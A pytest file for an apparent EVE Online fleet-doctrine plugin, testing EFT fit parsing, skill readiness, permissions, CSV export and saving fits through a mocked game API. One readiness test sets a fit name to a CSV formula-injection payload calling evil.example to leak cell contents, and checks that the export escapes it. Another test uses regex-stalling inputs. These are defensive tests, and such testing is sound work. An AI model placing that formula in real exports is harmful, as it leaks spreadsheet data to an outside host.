"""Doctrines: EFT in and out, who can fly what, managing, readiness, the group rule and saving to the game."""

import pytest
from django.contrib.auth.models import Permission

from conduit.access import rules
from conduit.accounts.models import Character
from conduit.plugins.services import set_enabled, sync_installed
from conduit.sde.models import ItemCategory, ItemGroup, ItemType, SkillInfo
from conduit.sheet.skills.models import CharacterSkill, SkillSummary
from conduit_doctrines import eft, services
from conduit_doctrines.models import Doctrine, DoctrineFit, Fit
from tests.conftest import make_user

SPACESHIP, FRIGATE, GUNNERY, SMALL_PROJ, DRONES, NAV = 3327, 3329, 3300, 3301, 3436, 3449
RIFTER, LOKI = 587, 29990
AUTOCANNON, LAUNCHER, EMP, AFTERBURNER, GYRO, RIG, BIG_RIG, WARRIOR, PASTE = 484, 499, 185, 438, 518, 31, 32, 2486, 28668
SUB_OFF, SUB_DEF = 45601, 45602

RIFTER_EFT = """[Rifter, Rifter Fleet]
Gyrostabilizer I
[Empty Low slot]

1MN Afterburner I /OFFLINE

125mm Gatling AutoCannon I, EMP S
125mm Gatling AutoCannon I, EMP S
[Empty High slot]

Small Projectile Burst Aerator I

Warrior I x3

Nanite Repair Paste x50
EMP S x200
"""


@pytest.fixture
def sde(db):
    for cid, name in [(6, "Ship"), (7, "Module"), (8, "Charge"), (16, "Skill"), (18, "Drone"), (4, "Material"), (32, "Subsystem")]:
        ItemCategory.objects.create(id=cid, name=name, published=True)
    for gid, cid, name in [(25, 6, "Frigate"), (963, 6, "Strategic Cruiser"), (55, 7, "Projectile Weapon"), (507, 7, "Missile Launcher"),
                           (83, 8, "Projectile Ammo"), (46, 7, "Propulsion Module"), (59, 7, "Gyrostabilizer"), (773, 7, "Rig"),
                           (257, 16, "Spaceship Command"), (255, 16, "Gunnery"), (273, 16, "Drones"), (100, 18, "Combat Drone"),
                           (18, 4, "Mineral"), (956, 32, "Offensive Systems")]:
        ItemGroup.objects.create(id=gid, category_id=cid, name=name, published=True)

    def t(tid, gid, name, fitting=None, required=()):
        ItemType.objects.create(id=tid, group_id=gid, name=name, published=True, fitting=fitting, required_skills=[list(r) for r in required])

    t(SPACESHIP, 257, "Spaceship Command")
    t(FRIGATE, 257, "Minmatar Frigate", required=[(SPACESHIP, 1)])
    t(GUNNERY, 255, "Gunnery")
    t(SMALL_PROJ, 255, "Small Projectile Turret", required=[(GUNNERY, 1)])
    t(DRONES, 273, "Drones")
    t(NAV, 257, "Navigation")
    for sid, rank, req in [(SPACESHIP, 1, []), (FRIGATE, 2, [[SPACESHIP, 1]]), (GUNNERY, 1, []), (SMALL_PROJ, 1, [[GUNNERY, 1]]),
                           (DRONES, 1, []), (NAV, 1, [])]:
        SkillInfo.objects.create(type_id=sid, rank=rank, primary_attribute="perception", secondary_attribute="willpower", required_skills=req)
    t(RIFTER, 25, "Rifter", {"hi": 4, "med": 3, "low": 4, "rig": 3, "sub": 0, "service": 0, "turrets": 3, "launchers": 2,
                             "cpu": 130, "power": 41, "calibration": 400, "rig_size": 1}, [(FRIGATE, 1)])
    t(LOKI, 963, "Loki", {"hi": 0, "med": 0, "low": 0, "rig": 3, "sub": 4, "service": 0, "turrets": 0, "launchers": 0,
                          "cpu": 400, "power": 500, "calibration": 400, "rig_size": 2})
    t(AUTOCANNON, 55, "125mm Gatling AutoCannon I", {"slot": "hi", "turret": True, "launcher": False, "cpu": 4, "power": 1}, [(SMALL_PROJ, 1)])
    t(LAUNCHER, 507, "Rocket Launcher I", {"slot": "hi", "turret": False, "launcher": True, "cpu": 10, "power": 2})
    t(EMP, 83, "EMP S", required=[(SMALL_PROJ, 1)])
    t(AFTERBURNER, 46, "1MN Afterburner I", {"slot": "med", "turret": False, "launcher": False, "cpu": 15, "power": 1}, [(NAV, 1)])
    t(GYRO, 59, "Gyrostabilizer I", {"slot": "low", "turret": False, "launcher": False, "cpu": 20})
    t(RIG, 773, "Small Projectile Burst Aerator I", {"slot": "rig", "turret": False, "launcher": False, "calibration": 100, "rig_size": 1})
    t(BIG_RIG, 773, "Medium Projectile Burst Aerator I", {"slot": "rig", "turret": False, "launcher": False, "calibration": 100, "rig_size": 2})
    t(WARRIOR, 100, "Warrior I", required=[(DRONES, 1)])
    t(PASTE, 18, "Nanite Repair Paste")
    t(SUB_OFF, 956, "Loki Offensive - Launcher Efficiency Configuration", {"slot": "sub", "turret": False, "launcher": False, "adds": {"hi": 5, "launchers": 5}})
    t(SUB_DEF, 956, "Loki Defensive - Covert Reconfiguration", {"slot": "sub", "turret": False, "launcher": False, "adds": {"med": 2, "low": 1}})


@pytest.fixture
def people(sde, corp):
    sync_installed()
    set_enabled("doctrines", True)
    fc = make_user(90000001, "FC Bob", corporation=corp, scopes="publicData esi-fittings.write_fittings.v1")
    fc.user_permissions.add(Permission.objects.get(codename="manage_doctrines"))
    pilot = make_user(90000002, "Pilot One", corporation=corp)
    return {"fc": type(fc).objects.get(pk=fc.pk), "pilot": pilot}


def train(char_id, *skills, attrs=True):
    if attrs:
        SkillSummary.objects.get_or_create(character_id=char_id, defaults={"perception": 25, "willpower": 20})
    for sid, level in skills:
        CharacterSkill.objects.update_or_create(character_id=char_id, skill_id=sid,
                                                defaults={"active_level": level, "trained_level": level, "skillpoints": 0})


def save_fit(api_client, user, text=RIFTER_EFT, **body):
    api_client.force_login(user)
    resp = api_client.call("post", "/api/p/doctrines/fits", {"eft": text, **body})
    assert resp.status_code == 200, resp.content
    return resp.json()


def test_eft_round_trip(sde):
    parsed = eft.parse(RIFTER_EFT)
    assert parsed["ship_type_id"] == RIFTER and parsed["name"] == "Rifter Fleet"
    assert parsed["unknown"] == [] and parsed["problems"] == []
    by_slot = {}
    for i in parsed["items"]:
        by_slot.setdefault(i["slot"], []).append(i)
    assert [i["charge_id"] for i in by_slot["hi"]] == [EMP, EMP]
    assert by_slot["med"][0]["offline"] is True
    assert by_slot["drone"] == [{"slot": "drone", "position": 0, "type_id": WARRIOR, "charge_id": None, "quantity": 3, "offline": False}]
    assert {(i["type_id"], i["quantity"]) for i in by_slot["cargo"]} == {(PASTE, 50), (EMP, 200)}

    fit = Fit(name=parsed["name"], ship_type_id=RIFTER, items=eft.normalise(parsed["items"]))
    types = {t.pk: t for t in ItemType.objects.all()}
    text = eft.export(fit, types)
    assert text.startswith("[Rifter, Rifter Fleet]\nGyrostabilizer I\n[Empty Low slot]\n[Empty Low slot]\n[Empty Low slot]\n\n")
    assert "1MN Afterburner I /OFFLINE\n[Empty Med slot]\n[Empty Med slot]" in text
    assert "125mm Gatling AutoCannon I, EMP S\n125mm Gatling AutoCannon I, EMP S\n[Empty High slot]\n[Empty High slot]" in text
    assert "Small Projectile Burst Aerator I\n[Empty Rig slot]\n[Empty Rig slot]\n\nWarrior I x3\n\n" in text
    # Reading the export gives the same fit back.
    again = eft.parse(text)
    assert eft.normalise(again["items"]) == fit.items


def test_eft_problems(sde):
    # Modules land by their slot whatever the section; too many highs, too many turrets, a rig of the wrong size,
    # and lines nobody knows.
    text = "[Rifter, Too much]\n" + "125mm Gatling AutoCannon I\n" * 4 + "Rocket Launcher I\nMedium Projectile Burst Aerator I\nSpace Banana\n[Something odd]"
    parsed = eft.parse(text)
    assert set(parsed["unknown"]) == {"Space Banana", "[Something odd]"}
    assert any("5 high slot modules, but the Rifter has 4" in p for p in parsed["problems"])
    assert any("4 turrets, but the Rifter has 3 turret hardpoints" in p for p in parsed["problems"])
    assert any("different ship size" in p for p in parsed["problems"])
    with pytest.raises(eft.FitError):
        eft.parse("[Space Banana, x]\nGyrostabilizer I")
    with pytest.raises(eft.FitError):
        eft.parse("Gyrostabilizer I")


def test_strategic_cruiser_slots_come_from_subsystems(sde):
    loki = "[Loki, Rockets]\nLoki Offensive - Launcher Efficiency Configuration\nLoki Defensive - Covert Reconfiguration\n" + "Rocket Launcher I\n" * 5
    assert eft.parse(loki)["problems"] == []
    assert any("6 high slot" in p for p in eft.parse(loki + "Rocket Launcher I")["problems"])
    fit = Fit(name="Rockets", ship_type_id=LOKI, items=eft.normalise(eft.parse(loki)["items"]))
    text = eft.export(fit, {t.pk: t for t in ItemType.objects.all()})
    assert text.count("[Empty Med slot]") == 2 and text.count("[Empty Low slot]") == 1 and text.count("[Empty Subsystem slot]") == 2


def test_who_can_fly_it(people, api_client):
    fc, pilot = people["fc"], people["pilot"]
    fit = save_fit(api_client, fc, recommended=[[NAV, 3]])
    assert fit["required"] == [{"skill_id": s, "name": n, "level": lvl} for s, n, lvl in
                               sorted([(DRONES, "Drones", 1), (FRIGATE, "Minmatar Frigate", 1), (NAV, "Navigation", 1),
                                       (SMALL_PROJ, "Small Projectile Turret", 1)], key=lambda r: r[1])]
    # Prerequisites come first in the plan.
    order = [s["skill_id"] for s in fit["required_steps"]]
    assert order.index(SPACESHIP) < order.index(FRIGATE) and order.index(GUNNERY) < order.index(SMALL_PROJ)

    api_client.force_login(pilot)
    me = api_client.call("get", f"/api/p/doctrines/fits/{fit['id']}").json()["characters"][0]
    assert me["status"] == "unknown"  # skills not synced yet
    train(90000002, (SPACESHIP, 1), (FRIGATE, 1), (GUNNERY, 1))
    me = api_client.call("get", f"/api/p/doctrines/fits/{fit['id']}").json()["characters"][0]
    assert me["status"] == "missing" and me["missing"] == 3 and me["seconds"] > 0
    assert {s["name"] for s in me["missing_steps"] if s["required"]} == {"Small Projectile Turret", "Drones", "Navigation"}
    plan = api_client.call("get", f"/api/p/doctrines/fits/{fit['id']}/plan?character=90000002").json()["text"]
    assert plan.splitlines() == ["Small Projectile Turret 1", "Drones 1", "Navigation 1", "Navigation 2", "Navigation 3"]
    train(90000002, (SMALL_PROJ, 1), (DRONES, 1), (NAV, 1))
    assert api_client.call("get", f"/api/p/doctrines/fits/{fit['id']}").json()["characters"][0]["status"] == "can_fly"
    train(90000002, (NAV, 3))
    assert api_client.call("get", f"/api/p/doctrines/fits/{fit['id']}").json()["characters"][0]["status"] == "ready"
    # Someone else's character can't be planned for.
    assert api_client.call("get", f"/api/p/doctrines/fits/{fit['id']}/plan?character=90000001").status_code == 400


def test_managing_needs_the_permission(people, api_client):
    api_client.force_login(people["pilot"])
    assert api_client.call("post", "/api/p/doctrines/fits", {"eft": RIFTER_EFT}).status_code == 403
    assert api_client.call("post", "/api/p/doctrines/doctrines", {"name": "Rifters"}).status_code == 403
    assert api_client.call("post", "/api/p/doctrines/parse", {"eft": RIFTER_EFT}).status_code == 403

    fit = save_fit(api_client, people["fc"], role="DPS")
    resp = api_client.call("post", "/api/p/doctrines/doctrines", {"name": "Rifter Gang", "fits": [fit["id"]]})
    doctrine = resp.json()
    assert doctrine["fits"][0]["name"] == "Rifter Fleet" and doctrine["fits"][0]["role"] == "DPS"
    # A fit that can't be fitted is refused; unknown lines are reported but the rest is saved.
    bad = api_client.call("post", "/api/p/doctrines/fits", {"eft": "[Rifter, x]\n" + "Gyrostabilizer I\n" * 5})
    assert bad.status_code == 400 and "4 low slots" in bad.json()["detail"]
    odd = save_fit(api_client, people["fc"], "[Rifter, Odd]\nGyrostabilizer I\nSpace Banana", doctrines=[doctrine["id"]])
    assert odd["unknown"] == ["Space Banana"] and odd["doctrines"] == [{"id": doctrine["id"], "name": "Rifter Gang"}]
    preview = api_client.call("post", "/api/p/doctrines/parse", {"eft": RIFTER_EFT}).json()
    assert preview["view"]["slots"]["hi"] == 4 and preview["view"]["hardpoints_used"]["turrets"] == 2
    cpu = next(r for r in preview["view"]["resources"] if r["key"] == "cpu")
    assert cpu == {"key": "cpu", "label": "CPU", "used": 28, "total": 130, "unit": "tf"}  # the offline afterburner doesn't count

    api_client.force_login(people["pilot"])
    overview = api_client.call("get", "/api/p/doctrines").json()
    assert overview["doctrines"][0]["fits"] == 2 and not overview["can_manage"]
    assert api_client.call("delete", f"/api/p/doctrines/fits/{fit['id']}").status_code == 403


def test_readiness_and_the_group_rule(people, api_client):
    fc, pilot = people["fc"], people["pilot"]
    fit = save_fit(api_client, fc, recommended=[[NAV, 3]])
    d = Doctrine.objects.create(name="Rifters")
    DoctrineFit.objects.create(doctrine=d, fit_id=fit["id"])
    train(90000002, (SPACESHIP, 1), (FRIGATE, 1), (GUNNERY, 1), (SMALL_PROJ, 1), (DRONES, 1), (NAV, 1))

    api_client.force_login(pilot)
    assert api_client.call("get", f"/api/p/doctrines/doctrines/{d.pk}/readiness").status_code == 403
    api_client.force_login(fc)  # managers see readiness too
    board = api_client.call("get", f"/api/p/doctrines/doctrines/{d.pk}/readiness").json()
    rows = {m["name"]: m for m in board["members"]}
    assert rows["Pilot One"]["cells"][str(fit["id"])]["status"] == "can_fly" and rows["Pilot One"]["flyable"] == 1
    assert rows["FC Bob"]["cells"][str(fit["id"])]["status"] == "unknown"
    assert board["totals"] == {str(fit["id"]): 1}
    # Which character it is stays hidden from people who can't open that member's character sheets...
    assert rows["Pilot One"]["cells"][str(fit["id"])]["character"] is None
    csv = api_client.call("get", f"/api/p/doctrines/doctrines/{d.pk}/readiness.csv").content.decode()
    assert "Pilot One,Can fly,1" in csv
    # ...and shown to those who can.
    fc.user_permissions.add(Permission.objects.get(codename="view_corporation_characters"))
    api_client.force_login(type(fc).objects.get(pk=fc.pk))
    csv = api_client.call("get", f"/api/p/doctrines/doctrines/{d.pk}/readiness.csv").content.decode()
    assert "Pilot One,Can fly (Pilot One),1" in csv
    # Fit names are free text: a spreadsheet must not run one as a formula.
    Fit.objects.filter(pk=fit["id"]).update(name='=HYPERLINK("https://evil.example/?"&A2,"x")')
    header = api_client.call("get", f"/api/p/doctrines/doctrines/{d.pk}/readiness.csv").content.decode().splitlines()[0]
    assert ",\"'=HYPERLINK(" in header
    Fit.objects.filter(pk=fit["id"]).update(name="Rifter Fleet")

    choices = dict(rules.RULE_TYPES["doctrine_can_fly"].params[0].options())
    assert choices == {str(fit["id"]): "Rifters – Rifter Fleet (Rifter)"}

    def rule(**params):
        return rules.evaluate_ruleset(pilot, rules.validate_ruleset({"rules": [{"type": "doctrine_can_fly", "params": params}]}))

    assert rule(fit=fit["id"])
    assert not rule(fit=fit["id"], level="recommended")
    assert rule(fit=fit["id"], scope="main") and rule(fit=fit["id"], scope="all")
    Character.objects.create(id=90000003, name="Pilot Alt", owner_hash="alt", user=pilot)  # an untrained alt
    assert rule(fit=fit["id"], scope="any") and not rule(fit=fit["id"], scope="all")
    assert rules.explain_rule({"type": "doctrine_can_fly", "params": {"fit": str(fit["id"]), "level": "required", "scope": "any"}}) == \
        "Can fly “Rifter Fleet” (Rifter) on any character"
    with pytest.raises(rules.RuleError):
        rules.validate_ruleset({"rules": [{"type": "doctrine_can_fly", "params": {"fit": 999}}]})


def test_character_tab_follows_sheet_access(people, api_client):
    fit = save_fit(api_client, people["fc"])
    d = Doctrine.objects.create(name="Rifters")
    DoctrineFit.objects.create(doctrine=d, fit_id=fit["id"])
    api_client.force_login(people["pilot"])
    tab = api_client.call("get", "/api/p/doctrines/characters/90000002").json()
    assert tab[0]["name"] == "Rifters" and tab[0]["fits"][0]["status"] == "unknown"
    assert api_client.call("get", "/api/p/doctrines/characters/90000001").status_code == 403


class FakeEsi:
    def __init__(self):
        self.posted = None

    def post(self, path, body, *, character=None):
        self.posted = (path, body)

        class R:
            data = {"fitting_id": 42}

        return R()


def test_save_to_eve(people, api_client, monkeypatch):
    fake = FakeEsi()
    monkeypatch.setattr("conduit.esi.client.esi", lambda: fake)
    fit = save_fit(api_client, people["fc"])
    assert api_client.call("post", f"/api/p/doctrines/fits/{fit['id']}/save-to-eve", {"character": 90000001}).json() == {"fitting_id": 42}
    path, body = fake.posted
    assert path == "/characters/90000001/fittings" and body["ship_type_id"] == RIFTER and body["name"] == "Rifter Fleet"
    flags = {(i["flag"], i["type_id"], i["quantity"]) for i in body["items"]}
    assert {("LoSlot0", GYRO, 1), ("MedSlot0", AFTERBURNER, 1), ("HiSlot0", AUTOCANNON, 1), ("HiSlot1", AUTOCANNON, 1),
            ("RigSlot0", RIG, 1), ("DroneBay", WARRIOR, 3), ("Cargo", PASTE, 50), ("Cargo", EMP, 202)} == flags
    # The pilot's character hasn't granted the scope; and nobody saves to someone else's character.
    api_client.force_login(people["pilot"])
    resp = api_client.call("post", f"/api/p/doctrines/fits/{fit['id']}/save-to-eve", {"character": 90000002})
    assert resp.status_code == 400 and "log in with it again" in resp.json()["detail"]
    assert api_client.call("post", f"/api/p/doctrines/fits/{fit['id']}/save-to-eve", {"character": 90000001}).status_code == 400


def test_search_and_widget(people, api_client):
    fit = save_fit(api_client, people["fc"])
    d = Doctrine.objects.create(name="Rifter Gang")
    DoctrineFit.objects.create(doctrine=d, fit_id=fit["id"])

    class Req:
        user = people["pilot"]

    hits = services.search(Req(), "rifter", 10)["hits"]
    assert {h["url"] for h in hits} == {f"/p/doctrines/{d.pk}", f"/p/doctrines/fit/{fit['id']}"}
    api_client.force_login(people["pilot"])
    assert api_client.call("get", "/api/p/doctrines/me").json()["total"] == 1


def test_pasted_fits_cannot_stall_the_server(sde):
    """Lines built to make a backtracking pattern take minutes are read in no time, and huge pastes are refused."""
    import time

    started = time.monotonic()
    with pytest.raises(eft.FitError):
        eft.parse("[a" + " " * 3000 + "b")
    parsed = eft.parse(RIFTER_EFT + "\n" + "a" + " " * 290 + "b x5\n" + "Damage Control II" + " " * 250 + "/ OFFLINE")
    assert time.monotonic() - started < 1
    assert len(parsed["unknown"]) == 2
    with pytest.raises(eft.FitError):
        eft.parse(RIFTER_EFT + "\n" * 3 + "x" * eft.MAX_TEXT)
    assert eft._quantity("Hobgoblin II x5") == ("Hobgoblin II", 5) and eft._quantity("Hobgoblin II x" + "9" * 5000) is None
    assert eft._offline("Damage Control II /OFFLINE") == ("Damage Control II", True)
    assert eft._header("[Rifter, My Rifter]") == ("Rifter", "My Rifter") and eft._header("[, x]") is None
